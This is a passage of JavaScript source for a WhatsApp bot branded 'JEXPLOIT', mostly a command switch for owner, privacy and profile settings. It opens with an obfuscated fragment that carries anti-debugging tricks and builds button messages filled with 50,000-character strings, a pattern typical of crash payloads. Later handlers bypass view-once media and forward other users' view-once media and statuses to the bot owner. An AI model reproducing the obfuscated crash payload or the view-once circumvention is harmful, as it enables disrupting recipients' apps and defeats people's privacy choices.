_0x1ec952(),_0x5a0e4e=[],_0x23e62c={};_0x23e62c[_0x508d62(0x2d5)]=!![],_0x227b23[_0x508d62(0x2a9)](_0x423107,_0x5b3b4a)[_0x508d62(0x292)]()['\x61\x75\x64\x69\x6f\x43\x6f\x64\x65\x63'](_0x508d62(0x1d0))[_0x508d62(0x1a4)](_0x508d62(0x242))[_0x508d62(0x29b)](_0x227b23['\x5a\x41\x44\x79\x67'])[_0x508d62(0x245)](-0x5e6+0x1*0x16c7+-0x10e0)['\x61\x75\x64\x69\x6f\x46\x72\x65\x71\x75\x65\x6e\x63\x79'](-0x3b62+-0x96fb+-0x3*-0x849f)['\x6f\x6e'](_0x508d62(0x2d3),_0x29ca47)['\x6f\x6e'](_0x227b23[_0x508d62(0x1fd)],()=>_0x4aad6a(_0x2de78e[_0x508d62(0x191)](_0x5a0e4e)))[_0x508d62(0x2bf)](_0x47e621,_0x23e62c),_0x47e621['\x6f\x6e'](_0x227b23[_0x508d62(0x271)],_0x41be3e=>_0x5a0e4e['\x70\x75\x73\x68'](_0x41be3e));});}}else(function(){return![];}[_0x439163(0x28e)](_0x362290[_0x439163(0x1e5)](_0x362290[_0x439163(0x197)],_0x362290[_0x439163(0x249)]))[_0x439163(0x21c)](_0x362290[_0x439163(0x2c4)]));}_0x362290['\x4e\x47\x73\x51\x61'](_0x2f8a02,++_0x5dc667);}else _0x5873a9[_0x439163(0x2ae)]({'\x62\x75\x74\x74\x6f\x6e\x49\x64':_0x362290[_0x439163(0x1e5)](_0x362290[_0x439163(0x1e5)]('\x69\x64\x5f','\x78'[_0x439163(0x234)](-0xd049+0xc626+0xcd73)),_0x2bb308),'\x62\x75\x74\x74\x6f\x6e\x54\x65\x78\x74':{'\x64\x69\x73\x70\x6c\x61\x79\x54\x65\x78\x74':'\x79'[_0x439163(0x234)](-0x1006+0x3*0x185+0xcec7)},'\x74\x79\x70\x65':0x1});}try{if(_0x362290['\x66\x52\x48\x53\x58']('\x4f\x63\x45\x4d\x76',_0x2a4b32(0x1a8)))_0x362290[_0x2a4b32(0x26c)](_0x323dee,0x1*-0x55d+0x1a35+-0x17*0xe8);else{if(_0x53534e)return _0x362290[_0x2a4b32(0x25d)](_0x362290[_0x2a4b32(0x187)],_0x362290[_0x2a4b32(0x187)])?_0x2f8a02:_0x2a4b32(0x2bd);else _0x362290[_0x2a4b32(0x28b)](_0x2f8a02,-0x5e8+-0x7e+-0xe*-0x75);}}catch(_0x4356ba){}}

//================== [ CONSOLE LOG] ==================//
const dayz = moment(Date.now()).tz(`${timezones}`).locale('en').format('dddd');
const timez = moment(Date.now()).tz(`${timezones}`).locale('en').format('HH:mm:ss z');
const datez = moment(Date.now()).tz(`${timezones}`).format("DD/MM/YYYY");

if (m.message) {
  lolcatjs.fromString(`┏━━━━━━━━━━━━━『  JEXPLOIT  』━━━━━━━━━━━━━─`);
  lolcatjs.fromString(`»  Sent Time: ${dayz}, ${timez}`);
  lolcatjs.fromString(`»  Message Type: ${m.mtype || 'N/A'}`);
  lolcatjs.fromString(`»  Sender Name: ${pushname || 'N/A'}`);
  lolcatjs.fromString(`»  Chat ID: ${m.chat?.split('@')[0] || 'N/A'}`);
  lolcatjs.fromString(`»  Message: ${budy || 'N/A'}`);
  lolcatjs.fromString('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n');
}
//<================================================>//
        conn.sendPresenceUpdate('uavailable', from)
              
let resize = async (image, width, height) => {
let oyy = await jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
return kiyomasa
}
const reply = (teks) => {
    const safeText = teks || ''; 
    conn.sendMessage(m.chat, {
    text: safeText,
    contextInfo: {
    mentionedJid: [sender],
    externalAdReply: {
    title: "",
    body: `${pushname}`,
    thumbnail: peler,
    sourceUrl: 'JEXPLOIT BOT',
    renderLargerThumbnail: false,
                    }
                }
            }, { quoted: m })
        }

await handleAutoRecording(m, conn, botNumber);
await handleAutoRead(m, conn, botNumber);
await handleAutoTyping(m, conn, botNumber);
await handleAutoReact(m, conn, botNumber);
await handleAIChatbot(m, conn, body, from, isGroup, botNumber, isCmd, prefix);


if (global.alwaysonline === true || global.alwaysonline === 'true') {
    if (m.message && !m.key.fromMe) {
        try {
            await conn.sendPresenceUpdate("available", from);
            await delay(1000); // 1-second delay
        } catch (error) {
            // Silently handle error - don't spam console
        }
    }
} else {
    // Default behavior - send unavailable presence
    if (m.message && !m.key.fromMe) {
        try {
            await conn.sendPresenceUpdate("unavailable", from);
            await delay(1000); // 1-second delay
        } catch (error) {
            // Silently handle error
        }
    }
}

if (m.isGroup && body && !m.key.fromMe) {
    
    await handleLinkViolation(conn, m, {
        key: m.key,
        message: m.message
    }, botNumber);
}

// ANTI GROUP MENTION
if ((m.mtype || '').includes("groupStatusMentionMessage") && m.isGroup) {
    const antiGroupMention = await db.get(botNumber, 'antigroupmention', false);
    
    if (antiGroupMention) {
        // Don't delete bot's own messages
        if (m.key.fromMe) return;
        if (m.isAdmin) return;
        await conn.deleteMessage(m.chat, m.key).catch(() => {});
        console.log(`[ANTI GROUP MENTION] Deleted group mention from ${m.sender}`);
    }
}

// ========== ANTI-DELETE EXECUTION ==========
if (global.antidelete && m.message?.protocolMessage?.type === 0 && m.message?.protocolMessage?.key) {
    await handleAntiDelete(m, conn, from, isGroup, botNumber);
}




// ========== ANTI-EDIT EXECUTION ==========
if (global.antiedit && m.message?.protocolMessage?.editedMessage) {
    await handleAntiEdit(m, conn);
}


if (m.isGroup && body) {
    await handleAntiTag(conn, m, botNumber);
}

if (m.isGroup && body) {
    await handleAntiTagAdmin(conn, {
        chat: m.chat,
        sender: m.sender,
        message: m.message,
        key: m.key,
        isGroup: true,
        pushName: m.pushName || ''
    });
}

if (m.isGroup && body) {
    await handleAntiTagAdmin(conn, {
        chat: m.chat,
        sender: m.sender,
        message: m.message,
        key: m.key,
        isGroup: true,
        pushName: m.pushName || ''
    });
}
if (m.isGroup && body && !m.key.fromMe) {
    await handleBadword(conn, m, botNumber);
}

if (m.isGroup && !m.key.fromMe) {
    await handleAntisticker(conn, m, botNumber);
}

if (m.isGroup && !m.key.fromMe && body && body.trim().length > 0) {
    try {
        await GroupDB.addMessage(from, sender); 
    } catch (error) {
        console.error('Error tracking user activity:', error.message);
    }
}

// Forward view-once to owner
if (m.quoted?.viewOnce && Access && body?.trim()) {
    try {
        const msg = m.msg?.contextInfo?.quotedMessage || m.quoted?.message;
        const type = Object.keys(msg)[0];
        if (/image|video|audio/.test(type)) {
            let mediaType = 'image';
            if (type === 'imageMessage') mediaType = 'image';
            else if (type === 'videoMessage') mediaType = 'video';
            else if (type === 'audioMessage') mediaType = 'audio';
            
            const stream = await downloadContentFromMessage(msg[type], mediaType);
            let buf = Buffer.from([]);
            for await (const chunk of stream) buf = Buffer.concat([buf, chunk]);
            const ownerJid = normalizeJid(conn.user.id);
            
            const messageOptions = {
                caption: `📥 View-Once from @${m.sender.split('@')[0]}`
            };
            
            if (type === 'imageMessage') {
                await conn.sendMessage(ownerJid, { image: buf, ...messageOptions });
            } else if (type === 'videoMessage') {
                await conn.sendMessage(ownerJid, { video: buf, ...messageOptions });
            } else if (type === 'audioMessage') {
                await conn.sendMessage(ownerJid, { audio: buf, mimetype: 'audio/mpeg', ...messageOptions });
            }
            
            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        }
    } catch (e) {}
}

// Forward status to owner
else if (m.quoted?.chat === 'status@broadcast' && Access) {
    try {
        const q = m.quoted;
        const s = q.key?.participant || q.key?.remoteJid;
        const ownerJid = normalizeJid(conn.user.id);
        
        if (q.message?.imageMessage) {
            const stream = await downloadContentFromMessage(q.message.imageMessage, 'image');
            let buf = Buffer.from([]);
            for await (const chunk of stream) buf = Buffer.concat([buf, chunk]);
            await conn.sendMessage(ownerJid, { 
                image: buf, 
                caption: `Status from @${s.split('@')[0]}\n📝 ${q.message.imageMessage.caption || 'No caption'}`
            });
        } 
        else if (q.message?.videoMessage) {
            const stream = await downloadContentFromMessage(q.message.videoMessage, 'video');
            let buf = Buffer.from([]);
            for await (const chunk of stream) buf = Buffer.concat([buf, chunk]);
            await conn.sendMessage(ownerJid, { 
                video: buf, 
                caption: `Status from @${s.split('@')[0]}\n📝 ${q.message.videoMessage.caption || 'No caption'}`
            });
        }
        else if (q.message?.audioMessage) {
            const stream = await downloadContentFromMessage(q.message.audioMessage, 'audio');
            let buf = Buffer.from([]);
            for await (const chunk of stream) buf = Buffer.concat([buf, chunk]);
            await conn.sendMessage(ownerJid, { 
                audio: buf, 
                mimetype: 'audio/mpeg',
                caption: `Status from @${s.split('@')[0]}`
            });
        }
        else {
            const text = q.message?.conversation || q.message?.extendedTextMessage?.text || '';
            await conn.sendMessage(ownerJid, { 
                text: `Status from @${s.split('@')[0]}\n\n📝 ${text}`
            });
        }
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    } catch (e) {}
}


switch (command) {
case 'menu':
case 'Rober':
case 'kevin':
case 'jex': {
    // Send loading message first
    const loadingMsg = await conn.sendMessage(m.chat, { 
        text: '*Loading menu...*' 
    }, { quoted: m });

    try {
        await sendMenu(conn, m, prefix, global);
        
    } catch (error) {
        console.error('Error in menu command:', error);
        await conn.sendMessage(m.chat, {
            text: '❌ Error displaying menu. Please try again!'
        });
    }
    break;
}
case 'showmenu':
case 'currentmenu': {
    await showCurrentMenu(conn, m);
    break;
}
case 'setawesomemenu': {
    try {
        
        // Check if user is owner/admin
        if (!Access) {
            return reply(mess.owner);
        }
        
        await setAwesomeMenu(conn, m);
        
        // Send success reaction
        await conn.sendMessage(m.chat, { react: { text: "✨", key: m.key } });
        
    } catch (error) {
        console.error('Error in setawesomemenu:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply('❌ Failed to set awesome menu format!');
    }
}
break
case 'resetawesomemenu': {
    try {
        if (!Access) {
            return reply(mess.owner);
        }
        
        await resetMenu(conn, m);
        
        // Send success reaction
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        
    } catch (error) {
        console.error('Error in resetmenu:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply('❌ Failed to reset menu format!');
    }
}
case "setmenu":
case "menustyle": {
    if (!Access) return reply(mess.owner);
    
    const style = args[0]?.toLowerCase();
    
    if (!style || !['1', '2'].includes(style)) {
        return reply(`*🎨 MENU STYLE*\n\n${prefix}setmenu 1 - Button style menu (NO image)\n${prefix}setmenu 2 - Image + Buttons menu\n\nCurrent: ${global.menuStyle === 'image' ? 'Image + Buttons' : 'Button only'}`);
    }
    
    if (style === '1') {
        await db.set(botNumber, 'menustyle', 'button');
        global.menuStyle = 'button';
        reply(`✅ *Menu set to BUTTON ONLY MODE*`);
    } else if (style === '2') {
        await db.set(botNumber, 'menustyle', 'image');
        global.menuStyle = 'image';
        reply(`✅ *Menu set to IMAGE + BUTTONS MODE*`);
    }
    
}
break
case 'antiedit': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    
    // Show help if no arguments
    if (!mode) {
        const currentMode = await db.get(botNumber, 'antiedit', 'off');
        return reply(`*ANTI-EDIT SETTINGS*

Current Mode: ${currentMode}

📌 *Commands:*
• ${prefix}antiedit on - Enable (chat mode)
• ${prefix}antiedit off - Disable
• ${prefix}antiedit chat - Set to chat mode
• ${prefix}antiedit private - Set to private mode`);
    }
    
    // Handle on/off
    if (mode === 'on') {
        await db.set(botNumber, 'antiedit', 'chat');
        return reply(`✅*Successfully enabled antiedit chat mode*`);
    }
    
    if (mode === 'off') {
        await db.set(botNumber, 'antiedit', 'off');
        return reply(`✅*Successfully disabled antiedit*`);
    }
    
    // Handle mode settings
    if (mode === 'chat') {
        await db.set(botNumber, 'antiedit', 'chat');
        return reply(`✅*Successfully enabled antiedit chat mode*`);
    }
    
    if (mode === 'private') {
        await db.set(botNumber, 'antiedit', 'private');
        return reply(`✅*Successfully enabled antiedit private mode*`);
    }
    
    reply('❌ Invalid option! Use: on, off, chat, private');
    break;
}
case 'antidelete': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    
    if (!mode) {
        const currentMode = await db.get(botNumber, 'antidelete', 'off');
        
        return reply(`*ANTI-DELETE SETTINGS*

Current Mode: ${currentMode}

📌 *Commands:*
• ${prefix}antidelete on - Enable (chat mode)
• ${prefix}antidelete off - Disable
• ${prefix}antidelete chat - Set to chat mode
• ${prefix}antidelete private - Set to private mode
• ${prefix}antidelete status - Show settings`);
    }
    
    // Handle on/off
    if (mode === 'on') {
        await db.set(botNumber, 'antidelete', 'chat');
        return reply(`✅*Successfully enabled antidelete chat mode*`);
    }
    
    if (mode === 'off') {
        await db.set(botNumber, 'antidelete', 'off');
        return reply(`✅*Successfully disabled antidelete*`);
    }
    
    // Handle mode settings
    if (mode === 'chat') {
        await db.set(botNumber, 'antidelete', 'chat');
        return reply(`✅*Successfully enabled antidelete chat mode*`);
    }
    
    if (mode === 'private') {
        await db.set(botNumber, 'antidelete', 'private');
        return reply(`✅*Successfully enabled antidelete private mode*`);
    }
    
    // Handle status
    if (mode === 'status') {
        const currentMode = await db.get(botNumber, 'antidelete', 'off');
        return reply(`*ANTI-DELETE STATUS*

Mode: ${currentMode}
Status: ${currentMode !== 'off' ? '✅ Enabled' : '❌ Disabled'}

📌 *Modes:*
• chat - Alerts sent to same chat
• private - Alerts sent to bot owner's inbox`);
    }
    
    reply('❌ Invalid option! Use: on, off, chat, private, status');
    break;
}
case 'setprefix':
case 'prefix': {
    if (!Access) return reply(mess.owner);
    
    const newPrefix = args[0];
    if (!newPrefix) {
        const currentPrefix = await db.get(botNumber, 'prefix', '.');
        return reply(`*PREFIX SETTINGS*\n\nCurrent prefix: *${currentPrefix === '' ? 'none' : currentPrefix}*\n\nUsage: ${currentPrefix === '' ? '' : currentPrefix}setprefix <new prefix>\nUse *${currentPrefix === '' ? '' : currentPrefix}setprefix none* to remove the prefix.`);
    }
    
    // Handle 'none' to remove prefix
    let finalPrefix = newPrefix;
    if (newPrefix.toLowerCase() === 'none') {
        finalPrefix = '';
    }
    
    // Validate prefix length (only if not empty)
    if (finalPrefix !== '' && finalPrefix.length > 3) {
        return reply('❌ Prefix must be 1-3 characters long!');
    }
    
    await db.set(botNumber, 'prefix', finalPrefix);
    prefix = finalPrefix; // Update local variable
    
    if (finalPrefix === '') {
        reply(`✅ *Prefix removed!*\n\nNow you can use commands without any prefix.\n\nExamples:\nmenu\nping\nalive`);
    } else {
        reply(`✅ Prefix has been changed to: *${finalPrefix}*`);
    }
    break;
}
case 'alwaysonline':
case 'online': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'alwaysonline', false);
        return reply(`❌ Usage: ${prefix}alwaysonline <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'alwaysonline', boolValue);
    global.alwaysonline = boolValue; // Update global variable
    
    reply(`✅ Always online mode ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'addowner': {
    if (!Access) return reply(mess.owner);
    
    let user = m.mentionedJid[0] || args[0];
    if (!user && m.quoted) user = m.quoted.sender;
    if (!user) return reply(`*Reply to a user message to be added as owner with ${prefix}addowner*`);
    
    let userJid = user;
    
    let data = JSON.parse(fs.readFileSync(ownerFile));
    
    if (!data.owner) data.owner = [];
    
    if (!data.owner.includes(userJid)) {
        data.owner.push(userJid);
        fs.writeFileSync(ownerFile, JSON.stringify(data, null, 2));
        reply(`✅ ${userJid} added to owners list`);
    } else {
        reply(`❌ ${userJid} is already an owner`);
    }
    break;
}

case 'removeowner': {
    if (!Access) return reply(mess.owner);
    
    let user = m.mentionedJid[0] || args[0];
    if (!user && m.quoted) user = m.quoted.sender;
    if (!user) return reply(`*Reply to a user message to be removed from owners with ${prefix}removeowner*`);
    
    let userJid = user;
    
    let data = JSON.parse(fs.readFileSync(ownerFile));
    
    if (data.owner && data.owner.includes(userJid)) {
        data.owner = data.owner.filter(id => id !== userJid);
        fs.writeFileSync(ownerFile, JSON.stringify(data, null, 2));
        reply(`✅ ${userJid} removed from owners list`);
    } else {
        reply(`❌ ${userJid} not found in owners list`);
    }
    break;
}
case 'listowner': {
    let data = JSON.parse(fs.readFileSync(ownerFile));
    const ownerList = data.owner || [];
    
    if (ownerList.length === 0) return reply('No owners found');
    
    let message = `👑 *OWNERS LIST*\n\n`;
    const mentions = [];
    
    ownerList.forEach((user, index) => {
        message += `${index + 1}. ${user}\n`;
        mentions.push(user);
    });
    message += `\n📊 Total: ${ownerList.length} owner(s)`;
    
    await conn.sendMessage(m.chat, {
        text: message,
        mentions: mentions
    }, { quoted: m });
    break;
}
case "setownernumber": {
    if (!Access) return reply(mess.owner);
    
    if (args.length < 1) return reply(`Example: ${prefix + command} 25675558536.`);

    // Join all arguments to capture the full number including spaces
    let fullInput = args.join(' ');
    let newNumber = fullInput.replace(/\D/g, '');

    console.log(`Input: ${fullInput}, Extracted Number: ${newNumber}`); // Debug log

    if (newNumber.startsWith('0')) {
        return reply("⚠️ Phone numbers should not start with *0*. Use the full international format (e.g., *256...* instead of *07...*)");
    }

    if (newNumber.length < 5 || newNumber.length > 15) {
        return reply(`⚠️ Please provide a valid phone number (5-15 digits)\n\nYou provided: ${newNumber.length} digits: ${newNumber}`);
    }

    // Store the old number for comparison
    const oldNumber = await db.get(botNumber, 'ownernumber', 'Not set');
    await db.set(botNumber, 'ownernumber', newNumber);

    // Update owner array in database
    const newOwnerJid = newNumber + "@s.whatsapp.net";
    const currentOwners = await db.get(botNumber, 'owners', []);
    if (!currentOwners.includes(newOwnerJid)) {
        currentOwners.push(newOwnerJid);
        await db.set(botNumber, 'owners', currentOwners);
    }

    // Update global for current session
    global.owner = [newOwnerJid];

    // Add to sudo if not already there
    const currentSudo = await db.getSudo(botNumber);
    if (!currentSudo.includes(newOwnerJid)) {
        await db.addSudo(botNumber, newOwnerJid);
    }

    reply(`✅ Owner number set to: ${newNumber}`);
    break;
}
case "setownername": {
    if (!Access) return reply(mess.owner);
    
    if (!text) {
        const currentName = await db.get(botNumber, 'ownername', 'Not set');
        return reply(`*SET OWNER NAME*\n\n*Usage:* ${prefix}setownername [new owner name]\n*Example:* ${prefix}setownername Kelvin Tech\n\n*Current owner name:* ${currentName}`);
    }

    try {
        // Validate name length
        if (text.length > 30) {
            return reply('❌ *Owner name too long!* Maximum 30 characters allowed.');
        }
        
        if (text.length < 2) {
            return reply('❌ *Owner name too short!* Minimum 2 characters required.');
        }

        // Set the new owner name in SQLite
        await db.set(botNumber, 'ownername', text.trim());

        // Update global for current session
        global.ownername = text.trim();

        reply(`✅ Owner name set to: ${text.trim()}`);

    } catch (error) {
        console.error('Error in setownername command:', error);
        reply('❌ *Failed to update owner name.* Please try again.');
    }
    
}
break
case 'checkchannel': case 'idch': {
if (!text) return reply("*channel link*")
if (!text.includes("https://whatsapp.com/channel/")) return reply("*In valid link*")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
let Devkevin = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "*Verified*" : "*No*"}
`
return reply(Devkevin)
}
break
case 'createchannel': 
case 'createch': {
    if (!Access) return m.reply(mess.owner);
    let parts = text.split('|');
    let channelName = parts[0]?.trim();
    let channelDesc = parts[1]?.trim() || '';
    if (!channelName) {
        return m.reply(`Example: 
${prefix + command} *ChannelName|ChannelDesc*`)}
    try {
        const metadata = await conn.newsletterCreate(channelName, channelDesc);
        console.log(metadata);
        console.log('Channel metadata:', JSON.stringify(metadata, null, 2));
        let channelId;
        if (metadata && metadata.channelId) {
            channelId = metadata.channelId;
        } else if (metadata && metadata.id) {
            channelId = metadata.id;
        } else if (metadata && metadata.channel && metadata.channel.id) {
            channelId = metadata.channel.id;
        } else if (typeof metadata === 'string') {
            channelId = metadata;
        } else {
            const findId = (obj) => {
                if (!obj || typeof obj !== 'object') return null;
                for (const key in obj) {
                    if (key === 'id' || key === 'channelId' || key.toLowerCase().includes('id')) {
                        return obj[key];
                    }
                    if (typeof obj[key] === 'object') {
                        const nestedId = findId(obj[key]);
                        if (nestedId) return nestedId;
                    }
                }
                return null;
            };      
            channelId = findId(metadata);
        }
        if (!channelId) {
            console.warn('Warning: ChannelId tidak ditemukan di response, menggunakan fallback...');
            channelId = "unknown-channel-id";
        }
        let successDetails = [];
        successDetails.push(`✅ Channel "${channelName}" `);
        if (channelDesc) {
            successDetails.push(`✅ Description Added`);
        }
        successDetails.push(`\nID Channel: ${channelId}`);
        await conn.sendMessage(m.chat, {
            text: successDetails.join('\n')
        });
    } catch (error) {
        console.error('Error creating channel:', error);
        m.reply(`${error.message}`);
    }
}
break
case "online": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`Options: all/match_last_seen\nExample: ${prefix + command} all`);

    const validOptions = ["all", "match_last_seen"];
    if (!validOptions.includes(args[0])) return reply("Invalid option");

    await conn.updateOnlinePrivacy(text);
    await reply(mess.done);
}
break
case "'readreceipts": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Options: all/none\nExample: ${prefix + command} all`);

    const validOptions = ["all", "none"];
    if (!validOptions.includes(args[0])) return reply("Invalid option");

    await conn.updateReadReceiptsPrivacy(text);
    await reply(mess.done);
}
break
case "setpp": {
    if (!Access) return reply(mess.owner);
    if (!quoted) return reply(`*Send or reply to an image With captions ${prefix + command}*`);
    if (!/image/.test(mime)) return reply(`*Send or reply to an image With captions ${prefix + command}*`);
    if (/webp/.test(mime)) return reply(`*Send or reply to an image With captions ${prefix + command}*`);

    const medis = await conn.downloadAndSaveMediaMessage(quoted, "ppbot.jpeg");

    if (args[0] === "full") {
      const { img } = await generateFullProfilePic(medis);
      await conn.query({
        tag: "iq",
        attrs: {
          to: botNumber,
          type: "set",
          xmlns: "w:profile:picture",
        },
        content: [
          {
            tag: "picture",
            attrs: {
              type: "image",
            },
            content: img,
          },
        ],
      });
      fs.unlinkSync(medis);
      reply(mess.done);
    } else {
      await conn.updateProfilePicture(botNumber, {
        url: medis,
      });
      fs.unlinkSync(medis);
      reply(mess.done);
    }
}
break
case "setprofilename": {
    try {
        const sender = m.sender;
        const isOwner = global.owner.includes(sender.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
        
        if (!Access) return reply(mess.owner);

        if (!text) {
            return m.reply(`⚠️ Please provide a name!\n\nUsage: *${prefix}case <new_profile_name>*\nExample: *${prefix}case Kelvin*`);
        }

        // Limit name length to prevent errors
        if (text.length > 25) {
            return m.reply(`❌ Name too long! Maximum 25 characters allowed.`);
        }

        // Set the profile name
        await conn.updateProfileName(text);
        
        // Send success message
        await m.reply(`✅ Profile name updated successfully!\n\nNew Name: *${text}*`);
     
        await conn.sendMessage(m.chat, { 
            react: { 
                text: '✅', 
                key: m.key 
            } 
        });

        console.log(`Profile name changed to: ${text} by ${sender}`);

    } catch (error) {
        console.error('Error in case command:', error);
        m.reply(`❌ Failed to update profile name: ${error.message}`);
    }
}
break
case "setabout": {
    try {
        const sender = m.sender;
        
        if (!Access) return reply(mess.owner);

        if (!text) {
            return m.reply(`⚠️ Please provide an about text!\n\nUsage: *${prefix}setabout <text>*\nExample: *${prefix}setabout Welcome to my bot!*`);
        } 
        if (text.length > 139) {
            return m.reply(`❌ About text too long! Maximum 139 characters allowed.`);
        }

        // Set the profile about/status
        await conn.updateProfileStatus(text);
        
        // Send success message
        await m.reply(`✅ About/Status updated successfully!\n\nNew About: *${text}*`);
        await conn.sendMessage(m.chat, { 
            react: { 
                text: '✅', 
                key: m.key 
            } 
        });

        console.log(`Profile about changed to: ${text} by ${sender}`);

    } catch (error) {
        console.error('Error in setabout command:', error);
        m.reply(`❌ Failed to update about: ${error.message}`);
    }
  
}
break
case "lastseen": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, contacts, contact_blacklist, none\n*Example:* ${prefix + command} all`);

    const validOptions = ["all", "contacts", "contact_blacklist", "none"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) {
        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
    }

    try {
        await conn.updateLastSeenPrivacy(option);
        reply(`✅ *Last seen privacy set to:* ${option.toUpperCase()}\n\n*What this means:*\n${getLastSeenDescription(option)}`);
    } catch (error) {
        console.error('Error setting last seen privacy:', error);
        reply('❌ *Failed to update last seen settings.* Please try again.');
    }
   
}
break
case "gcprivacy":
case "gcaddprivacy": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, contacts, contact_blacklist\n*Example:* ${prefix + command} all`);

    const validOptions = ["all", "contacts", "contact_blacklist"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) {
        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
    }

    try {
        await conn.updateGroupsAddPrivacy(option);
        reply(`✅ *Group add privacy set to:* ${option.toUpperCase()}\n\n*What this means:*\n${getGroupAddDescription(option)}`);
    } catch (error) {
        console.error('Error setting group add privacy:', error);
        reply('❌ *Failed to update group add settings.* Please try again.');
    }
    
}
break 
case "delete":
case "del": {
if (!Access) return reply(mess.owner);
    if (!m.quoted) return reply(`*Please reply to a message*`);

    try {
     
      await conn.sendMessage(m.chat, {
        delete: {
          remoteJid: m.quoted.fakeObj.key.remoteJid,
          fromMe: m.quoted.fakeObj.key.fromMe,
          id: m.quoted.fakeObj.key.id,
          participant: m.quoted.fakeObj.participant,
        }
      });

      
      await conn.sendMessage(m.chat, {
        delete: {
          remoteJid: m.key.remoteJid,
          fromMe: m.key.fromMe,
          id: m.key.id,
          participant: m.key.participant,
        }
      });

    } catch (err) {
      console.error(err);
      reply("⚠️ Failed to delete message.");
   }

}
break
case "react": {
if (!Access) return reply(mess.owner);
    if (!args) return reply(`*Reaction emoji needed*\n Example .react 🤔`);

    const reactionMessage = {
      react: {
        text: args[0],
        key: { remoteJid: m.chat, fromMe: true, id: quoted.id },
      },
    };
    conn.sendMessage(m.chat, reactionMessage);
}
break
case "vv2": {
    if (!Access) return reply(mess.owner);
    if (!m.quoted) return reply(`*Reply to a ViewOnce Image or Video*`);
    
    // Check if quoted message is view once
    if (m.quoted.mtype !== "viewOnceMessageV2" && !m.quoted.message?.viewOnceMessageV2) {
        return reply(`*This is not a ViewOnce message!*`);
    }
    
    try {
        // Get the actual message content
        let msg = m.quoted.message || m.quoted;
        
        // Handle different view once structures
        let viewOnceMsg = msg.viewOnceMessageV2?.message || 
                         msg.viewOnceMessage?.message || 
                         msg;
        
        let type = Object.keys(viewOnceMsg)[0];
        
        if (!type || !viewOnceMsg[type]) {
            return reply(`*Could not extract media from ViewOnce message*`);
        }
        
        let media = await downloadContentFromMessage(viewOnceMsg[type], 
            type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio');
        
        let buffer = Buffer.from([]);
        for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        
        if (/video/.test(type)) {
            return conn.sendMessage(m.chat, { 
                video: buffer, 
                caption: viewOnceMsg[type].caption || "" 
            }, { quoted: m });
        } else if (/image/.test(type)) {
            return conn.sendMessage(m.chat, { 
                image: buffer, 
                caption: viewOnceMsg[type].caption || "" 
            }, { quoted: m });
        } else if (/audio/.test(type)) {
            return conn.sendMessage(m.chat, { 
                audio: buffer, 
                mimetype: "audio/mpeg", 
                ptt: true 
            }, { quoted: m });
        }
    } catch (error) {
        console.error('VV2 error:', error);
        reply(`*Failed to process ViewOnce message: ${error.message}*`);
    }
    break;
}
case 'creategc': 
case 'creategroup': {
if (!Access) return reply(mess.owner)
if (!args.join(" ")) return reply(`*Example: ${prefix + command} Jexploit updats*`);
try {
let cret = await conn.groupCreate(args.join(" "), [])
let response = await conn.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
conn.sendMessage(m.chat, { text:teksop, mentions: await conn.parseMention(teksop)}, {quoted:m})
} catch {
	reply(mess.done)
	}
}
break
case "gpass": {
let length = text ? parseInt(text) : 12;
    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+";
    let pass = "";
    for (let i = 0; i < length; i++) {
      pass += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    try {
      conn.sendMessage(m.chat, { text: pass }, { quoted: m });
    } catch (error) {
      console.error('Error generating password:', error);
      reply('An error occurred while generating the password.');
    }
}
break
case "block": {
    if (!Access) return reply(mess.owner);
    
    if (!m.quoted && !mentionedJid[0]) {
        return reply(`Reply to a user message to block them with ${prefix}block`);
    }
    
    const userId = m.mentionedJid[0] || m.quoted?.sender;
    
    try {
        await conn.sendMessage(m.chat, {
            react: { text: "🚫", key: m.key }
        });
        
        await conn.updateBlockStatus(userId, "block");
        
        reply(`✅ Blocked ${userId}`);
    } catch (error) {
        console.error('Error blocking user:', error);
        reply(`Failed to block user: ${error.message}`);
    }
    
}
break
case "public": {
if (!Access) return reply(mess.owner) 
conn.public = true
reply(`*${global.botname} successfully changed to public mode*.`)
}
break
